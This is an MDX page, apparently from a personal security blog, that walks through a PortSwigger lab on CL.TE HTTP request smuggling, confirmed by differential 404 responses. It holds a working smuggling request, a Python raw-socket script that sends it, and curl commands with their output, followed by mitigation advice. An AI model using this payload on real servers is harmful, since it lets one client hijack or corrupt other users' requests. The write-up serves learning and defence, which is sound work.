@@ -1,0 +1,167 @@
+---
+title: "HTTP Request Smuggling: Confirming CL.TE via Differential Responses"
+description: "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response. Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1."
+labUrl: "https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses"
+category: "HTTP Request Smuggling"
+date: "2026-07-26"
+portswiggerDescription: "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response. Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1."
+lang: "en"
+---
+
+import CollapsiblePartial from '../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../components/PartialContainer.astro';
+
+## Necessary Background Concepts To Solve The Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="http-request-smuggling" title="HTTP Request Smuggling Basics" />
+  <CollapsiblePartial partial="cl-te-differential-responses" title="CL.TE & Differential Responses" />
+</PartialContainer>
+
+## Writeup
+
+### Solving the lab with Burp
+
+In Burp, PortSwigger's solution is to send this request **twice** in Repeater (HTTP/1.1). The first send leaves a smuggled prefix on the back-end connection; the second should get `404 Not Found`. For this lab, that differential `404` *is* the solution.
+
+```http
+POST / HTTP/1.1
+Host: <lab-url>.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+```
+
+### Why curl alone is not enough
+
+Let's force HTTP/1.1 and try to send both length headers:
+
+```bash
+curl -s --http1.1 -D - "https://<lab-url>.web-security-academy.net/" \
+  -H "Transfer-Encoding: chunked" \
+  -H "Content-Length: 35" \
+  --data-binary $'0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X' -o /dev/null
+```
+
+> **Command breakdown**: \
+`--http1.1` = use HTTP/1.1 (needed for this attack; HTTP/2 won't work the same way) \
+`-H "Transfer-Encoding: chunked"` / `-H "Content-Length: 35"` = try to send both length headers \
+`--data-binary` = send the body exactly as written
+
+Two problems:
+
+1. With `Transfer-Encoding: chunked`, curl usually **removes or rewrites** `Content-Length`, so the conflict of interpretation we need disappears
+2. Curl still "fixes" the request for us instead of sending our raw bytes
+
+So we stop using curl's HTTP client and send raw HTTP/1.1 over TLS. Still simple tools, just not Burp.
+
+We will rebuild the same idea without Burp, step by step.
+
+### Crafting the CL.TE smuggling request
+
+First, count the bytes of the **smuggled payload** (just the body of our request; every `\r\n` matters):
+
+```python
+print(len(b"0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X"))
+# 35
+```
+
+> **Script breakdown**: \
+`print(len(...))` = count how many bytes the body has, so `Content-Length` can match exactly \
+`b"..."` = a byte string, so `\r\n` are real CRLF bytes (not the two characters `\` and `n`) \
+`0` = chunk size zero: in chunked encoding this means "end of body" for the back-end \
+`\r\n\r\n` after `0` = finish that empty chunk (size line, then blank line) \
+`GET /404 HTTP/1.1\r\n` = the smuggled request line the back-end will treat as the next request \
+`X-Ignore: X` = dummy header that absorbs the start of the following real request when they get glued together \
+`# 35` = the length we need in `Content-Length`
+
+That matches `Content-Length: 35`.
+
+**So in this attack, each server will do the following:**
+
+1. **Front-end** receives our `POST /` request and, using `Content-Length: 35`, forwards those 35 body bytes (our smuggled payload) to the back-end
+2. **Back-end** uses chunked encoding (`Transfer-Encoding: chunked`), sees chunk `0`, thinks the request is finished, and returns the response for our `POST /`
+3. The back-end never reads `GET /404 HTTP/1.1\r\nX-Ignore: X`, so those bytes sit unread in its receive buffer
+4. The next request on that connection is glued onto the leftover. For example, if the next user (or our second send) starts with `POST / HTTP/1.1...`, the back-end effectively sees:
+
+```http
+GET /404 HTTP/1.1
+X-Ignore: XPOST / HTTP/1.1
+Host: ...
+```
+
+The back-end therefore runs our smuggled `GET /404`, not whatever the next user asked for. Their real request (here `POST /`) is only appended onto `X-Ignore`, which is very likely ignored as an unknown header. So they get **404 Not Found**, no matter which endpoint they meant to hit.
+
+### Smuggling with Python, then triggering with curl
+
+First we'll use Python sockets to send the smuggling request once and leave `GET /404` sitting unread in the back-end buffer. Then, on a separate normal connection, we'll use curl to request `/` like the next user would. Our curl is a new client connection; the front-end may still reuse the same back-end socket, which is how the leftover bytes get applied. That second request should get the smuggled **404**:
+
+```python
+import ssl, socket
+
+host = "<lab-url>.web-security-academy.net"
+body = b"0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X"
+
+ctx = ssl.create_default_context()
+with socket.create_connection((host, 443), timeout=10) as raw:
+    with ctx.wrap_socket(raw, server_hostname=host) as sock:
+        sock.settimeout(5)
+        req = (
+            f"POST / HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"\r\n"
+        ).encode() + body
+        sock.sendall(req)
+        print(sock.recv(4096).split(b"\r\n", 1)[0].decode())
+```
+
+Output:
+
+```
+HTTP/1.1 200 OK
+```
+
+> **Script breakdown**: \
+`ssl` + `socket` = send raw HTTP/1.1 over HTTPS, no auto-fixes from curl \
+`Content-Length: {len(body)}` = keep CL matching the smuggled body exactly \
+`Transfer-Encoding: chunked` = what the back-end trusts, so chunk `0` ends the request early \
+`print(...split...)` = show only the first line of the response (the status header) from the Python request
+
+Then trigger the next request as a normal user with curl:
+
+```bash
+curl -si --http1.1 "https://<lab-url>.web-security-academy.net/"
+```
+
+```
+HTTP/1.1 404 Not Found
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+
+"Not Found"
+```
+
+> **Command breakdown**: \
+`-s` = silent mode (no progress meter) \
+`-i` = include response headers in the output \
+`--http1.1` = use HTTP/1.1 on a normal separate connection, like the next user hitting `/`
+
+That flip from `200` to `404` is what the lab wants.
+
+**No carlos were harmed in this lab. Instead of sending him into the digital void, we sent the next user's request there. Close enough.**
+
+## Mitigation
+
+1. **Prefer HTTP/2 end-to-end**: classic CL.TE smuggling needs HTTP/1 ambiguity, so HTTP/2 end-to-end is safe from *this* variant. It is not a free pass against every desync; other request-smuggling styles still exist when HTTP/2 is downgraded or mixed with HTTP/1 on the back-end
+2. **Reject unclear requests**: if both `Content-Length` and `Transfer-Encoding` are present, reject and close the connection
+3. **Make both servers agree**: front-end should clean requests; back-end should refuse anything still unclear
+4. **Be careful with connection reuse**: turning off back-end keep-alive helps a bit, but it is not a full fix
